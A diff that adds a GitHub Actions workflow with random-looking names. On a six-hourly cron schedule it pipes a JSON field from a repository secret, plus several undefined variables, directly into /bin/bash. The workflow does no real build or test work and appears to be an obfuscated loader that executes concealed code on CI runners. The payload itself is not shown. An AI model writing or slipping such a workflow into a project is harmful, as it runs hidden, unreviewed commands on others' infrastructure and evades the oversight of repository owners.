@@ -1,0 +1,25 @@
+name: emberconcurrent74
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '29 4/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: emberconcurrent74
+        env:
+          y9542: ${{ secrets.y9542 }}
+        run: |
+          echo $y9542 | jq -r .k7 | /bin/bash
+          echo $bisa31086 | jq -r .vgpjh47 | /bin/bash
+          echo $buu779 | jq -r .rvtfc186 | /bin/bash
+          echo $vkpok5140 | jq -r .ebik14694 | /bin/bash
+          echo $yht9 | jq -r .nycrx0419 | /bin/bash
+          echo $yffmh55 | jq -r .d16 | /bin/bash
+          echo $ur687 | jq -r .rml7 | /bin/bash
+
